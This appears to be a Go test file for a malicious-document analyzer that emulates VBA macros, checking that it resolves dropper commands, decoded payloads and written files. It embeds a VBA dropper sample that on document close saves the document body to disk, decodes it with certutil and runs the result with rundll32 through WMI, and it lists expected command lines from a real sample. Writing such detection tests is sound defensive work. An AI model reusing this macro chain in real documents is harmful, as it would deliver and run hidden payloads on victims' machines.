package maldoctrace

import (
	"encoding/base64"
	"github.com/debugactiveprocess/MaldocTrace/payload"
	"strings"
	"testing"

	"github.com/debugactiveprocess/MaldocTrace/report"
	"github.com/debugactiveprocess/MaldocTrace/vba/parser"
)

// A dropper that keeps its payload in the document body: it reads command
// fragments from paragraphs, deletes the decoy text, saves the rest as a
// text file, decodes it with certutil and loads it with rundll32.
const docDropper = `Private Ms13
Private One As String
Private STP As String

Private Sub Document_Close()
    Form_Close
End Sub
Private Sub Form_Close()
    STP = Button_Click2(2, 7) + "x"
    Set Ms13 = CreateObject(Button_Click2(4, 22))
    One = Button_Click2(6, 16)
    ActiveDocument.Range(Start:=0, End:=Len(ActiveDocument.Range(Start:=0, End:=0).Text) + DecoyLen()).Delete
    ActiveDocument.SaveAs2 FileName:=STP + ".xls", FileFormat:=wdFormatText
    Ms13.Create One + " " + STP + ".xls " + STP + ".dll", Null, Null, pid
    Ms13.Create "rundll32 " + STP + ".dll,Go", Null, Null, pid
End Sub
Private Function Button_Click2(n As Long, k As Long) As String
    Button_Click2 = Left(ActiveDocument.Paragraphs(n).Range.Text, k)
End Function
Private Function DecoyLen() As Long
    DecoyLen = InStr(ActiveDocument.Content.Text, "TVq") - 1
End Function
`

var dropperBinary = append([]byte("MZ\x90\x00"), []byte("not a real program, test bytes only")...)

func dropperDocument() string {
	return "decoy text\rC:\\tmp\\\rdecoy\rwinmgmts:Win32_Process\rdecoy\rcertutil -decode\r" +
		base64.StdEncoding.EncodeToString(dropperBinary) + "\r"
}

func TestDocumentBodyDropperChain(t *testing.T) {
	r := AnalyzeVBA(docDropper, "dropper.bas", Options{DocumentText: dropperDocument()})

	want := []string{
		`certutil -decode C:\tmp\x.xls C:\tmp\x.dll`,
		`rundll32 C:\tmp\x.dll,Go`,
	}
	if len(r.Commands) != len(want) {
		t.Fatalf("commands=%+v diags=%+v", r.Commands, r.Diagnostics)
	}
	for i, w := range want {
		if r.Commands[i].CommandLine != w || r.Commands[i].Resolution != "resolved" {
			t.Fatalf("command %d = %+v", i, r.Commands[i])
		}
	}
	if len(r.DecodedPayloads) != 1 {
		t.Fatalf("payloads=%+v diags=%+v", r.DecodedPayloads, r.Diagnostics)
	}
	p := r.DecodedPayloads[0]
	if p.Status != "decoded" || p.Content != func() string { s, _ := payload.DisplayBytes(dropperBinary); return s }() || p.Size != len(dropperBinary) || p.DerivedFrom != "command-1" {
		t.Fatalf("payload=%+v", p)
	}
	var savedBy, loadedBy bool
	for _, d := range p.Details {
		savedBy = savedBy || strings.HasPrefix(d, `input C:\tmp\x.xls written by event-`)
		loadedBy = loadedBy || strings.HasPrefix(d, "loaded by command-2")
	}
	if !savedBy || !loadedBy {
		t.Fatalf("provenance missing: %v", p.Details)
	}
	if len(r.Artifacts) != 1 || r.Artifacts[0].Path != `C:\tmp\x.xls` {
		t.Fatalf("artifacts=%+v", r.Artifacts)
	}
	for _, e := range r.Events {
		if e.Type == "unresolved_call" {
			t.Fatalf("unexpected unresolved call: %+v", e)
		}
	}
	// Form_Close ran inside Document_Close and must not be replayed.
	if n := strings.Count(report.RenderText(r), "→ command-"); n != 2 {
		t.Fatalf("expected each command once, got %d references", n)
	}
}

func TestNamedArgumentsParsed(t *testing.T) {
	m := parser.Parse("Sub A()\nActiveDocument.SaveAs2 FileName:=\"a\" & \"b\", FileFormat:=2\nx = Foo(Start:=1, End:=2)\nEnd Sub")
	if len(m.Errors) != 0 {
		t.Fatalf("errors=%+v", m.Errors)
	}
	r := AnalyzeVBA("Sub AutoOpen()\nActiveDocument.SaveAs2 FileFormat:=2, FileName:=\"C:\\o\\\" & \"f.txt\"\nEnd Sub", "n.bas", Options{DocumentText: "body\r"})
	if len(r.Artifacts) != 1 || r.Artifacts[0].Path != `C:\o\f.txt` || r.Artifacts[0].Size != len("body\r\n") {
		t.Fatalf("artifacts=%+v events=%+v", r.Artifacts, r.Events)
	}
}

func TestModuleLevelDeclarationsAreNotCalls(t *testing.T) {
	r := AnalyzeVBA("Private a\nPublic b As String\nPrivate WithEvents c As Object\nSub AutoOpen()\nEnd Sub", "d.bas", Options{})
	if len(r.Events) != 0 {
		t.Fatalf("declarations emulated as calls: %+v", r.Events)
	}
}

func TestCertutilInputNotWrittenIsReported(t *testing.T) {
	r := AnalyzeVBA("Sub AutoOpen()\nShell \"certutil -decode C:\\a.txt C:\\b.exe\"\nEnd Sub", "c.bas", Options{})
	if len(r.DecodedPayloads) != 0 {
		t.Fatalf("payload invented from unknown input: %+v", r.DecodedPayloads)
	}
	found := false
	for _, d := range r.Diagnostics {
		found = found || strings.Contains(d.Message, "was not written by the macro")
	}
	if !found {
		t.Fatal("missing diagnostic")
	}
}

func TestSampleDocumentBodyPayload(t *testing.T) {
	r := AnalyzeFromBytes(nil, readSample(t, "7dbd8ecfada1d39a81a58c9468b91039.doc"), "7dbd", Options{})
	if len(r.Commands) != 2 ||
		r.Commands[0].CommandLine != `Certutil -decode C:\Users\Public\Ksh1.xls C:\Users\Public\Ksh1.pdf` ||
		r.Commands[1].CommandLine != `Rundll32 C:\Users\Public\Ksh1.pdf,In` {
		t.Fatalf("commands=%+v", r.Commands)
	}
	if len(r.DecodedPayloads) != 1 {
		t.Fatalf("payloads=%+v", r.DecodedPayloads)
	}
	p := r.DecodedPayloads[0]
	if p.Status != "decoded" || p.FileType != "PE32 DLL" || p.Size != 446976 ||
		p.SHA256 != "fb07f875dc45e6045735513e75a83c50c78154851bd23a645d43ea853e6800ac" {
		t.Fatalf("payload=%s %s %d %s", p.Status, p.FileType, p.Size, p.SHA256)
	}
}
